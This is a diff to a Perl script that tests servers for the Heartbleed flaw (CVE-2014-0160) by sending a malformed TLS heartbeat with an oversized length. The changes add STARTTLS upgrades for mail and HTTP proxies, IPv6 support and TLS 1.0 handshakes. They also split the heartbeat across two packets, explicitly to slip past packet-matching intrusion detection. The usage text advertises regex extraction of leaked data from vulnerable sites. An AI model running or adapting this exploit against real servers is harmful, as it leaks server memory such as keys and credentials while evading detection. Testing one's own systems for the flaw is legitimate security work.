@@ -5,20 +5,28 @@
 use strict;
 use warnings;
 use Getopt::Long qw(:config posix_default bundling);
-use IO::Socket;
+
+# try to use IPv6
+my $INETCLASS;
+BEGIN {
+    my @mod = qw(IO::Socket::IP IO::Socket::INET6 IO::Socket::INET);
+    while ($INETCLASS = shift @mod) {
+	last if eval "require $INETCLASS";
+	die "failed to load $INETCLASS: $@" if ! @mod;
+    }
+}
 
 my $starttls = sub {1};
 my $starttls_arg;
 my $timeout = 5;
-my $heartbeats = 1;
 my $quiet = 0;
 my $show = 0;
 my @show_regex;
 my %starttls = (
-    'smtp' => \&smtp_starttls,
-    'http' => \&http_connect,
-    'imap' => \&imap_starttls,
-    'pop'  => \&pop_stls,
+    'smtp' => [ 25, \&smtp_starttls ],
+    'http' => [ 8000, \&http_connect ],
+    'imap' => [ 143, \&imap_starttls ],
+    'pop'  => [ 110, \&pop_stls ],
 );
 
 sub usage {
@@ -26,17 +34,27 @@ sub usage {
     print STDERR <<USAGE;
 
 Check if server is vulnerable against heartbleed SSL attack (CVE-2014-0160)
+Features:
+- can start with plain and upgrade with STARTTLS or similar commands with
+  IMAP, POP, SMTP and HTTP proxies
+- heartbeat request is sent in two packets to circumvent simple packet
+  matching IDS or packet filters
+- handshake is done with TLS1.0 for better compatibility, heartbeat uses
+  SSL version from server
+- can use regular expressions to directly extract information from
+  vulnerable sites
+- can use IPv6
+
 Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
+  -h|--help              - this screen
   --starttls proto[:arg] - start plain and upgrade to SSL with
 			   starttls protocol (imap,smtp,http,pop)
   -T|--timeout T         - use timeout (default 5)
-  -H|--heartbeats N      - number of heartbeats (default 1)
   -s|--show-data [L]     - show heartbeat response if vulnerable, optional 
                            parameter L specifies number of bytes per line (16)
   -R|--show-regex-data R - show data matching perl regex R. Option can be
                            used multiple times
   -q|--quiet             - don't show anything, exit 1 if vulnerable
-  -h|--help              - this screen
 
 Examples:
   # check direct www, imaps .. server
@@ -64,17 +82,18 @@ USAGE
     exit(2);
 }
 
+my $default_port = 443;
 GetOptions(
     'h|help' => sub { usage() },
     'T|timeout=i' => \$timeout,
-    'H|heartbeats=i' => \$heartbeats,
     's|show-data:i' => sub { $show = $_[1] || 16 },
     'R|show-regex-match:s' => \@show_regex,
     'q|quiet' => \$quiet,
     'starttls=s' => sub {
 	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
-	usage("invalid starttls protocol $_[1]") if ! $proto
-	    or not $starttls = $starttls{$proto};
+	my $st = $proto && $starttls{$proto};
+	usage("invalid starttls protocol $_[1]") if ! $st;
+	($default_port,$starttls) = @$st;
     },
 );
 
@@ -88,14 +107,23 @@ if (@show_regex) {
 }
 
 my $dst = shift(@ARGV) or usage("no destination given");
-my $cl = IO::Socket::INET->new(PeerAddr => $dst, Timeout => $timeout)
+$dst .= ":$default_port" if $dst !~ m{^([^:]+|.+\]):\w+$};
+my $cl = $INETCLASS->new(PeerAddr => $dst, Timeout => $timeout)
     or die "failed to connect: $!";
+
+# disable NAGLE to send heartbeat with multiple small packets
+setsockopt($cl,6,1,pack("l",1));
+
+# skip plaintext before starting SSL handshake
 $starttls->($cl);
 
+
 # client hello with heartbeat extension
-# taken from http://s3.jspenguin.org/ssltest.py
+# based on http://s3.jspenguin.org/ssltest.py
+# use only TLS 1.0 in case there are some stupid load balancers
+# which don't understand anything better
 print $cl pack("H*",join('',qw(
-		16 03 02 00  dc 01 00 00 d8 03 02 53
+		16 03 01 00  dc 01 00 00 d8 03 01 53
     43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
     bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
     00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
@@ -111,16 +139,24 @@ print $cl pack("H*",join('',qw(
     00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
     00 0f 00 01 01
 )));
+my $use_version;
 while (1) {
     my ($type,$ver,@msg) = _readframe($cl) or die "no reply";
-    last if $type == 22 and grep { $_->[0] == 0x0e } @msg; # server hello done
+    if ( $type == 22 and grep { $_->[0] == 0x0e } @msg ) {
+	# server hello done
+	$use_version = $ver;
+	last;
+    }
 }
 # heartbeat request with wrong size
-# taken from http://s3.jspenguin.org/ssltest.py
-for(1..$heartbeats) {
-    verbose("...send heartbeat#$_");
-    print $cl pack("H*",join('',qw(18 03 02 00 03 01 40 00)));
-}
+# send in two packets to work around stupid IDS which try
+# to detect attack by matching packets only
+verbose("...send heartbeat_");
+my $hb = pack("Cnn/a*",0x18,$use_version,
+    pack("Cn",1,0x4000));
+print $cl substr($hb,0,1,'');
+print $cl $hb;
+
 if ( my ($type,$ver,$buf) = _readframe($cl)) {
     if ( $type == 21 ) {
 	verbose("received alert (probably not vulnerable)");
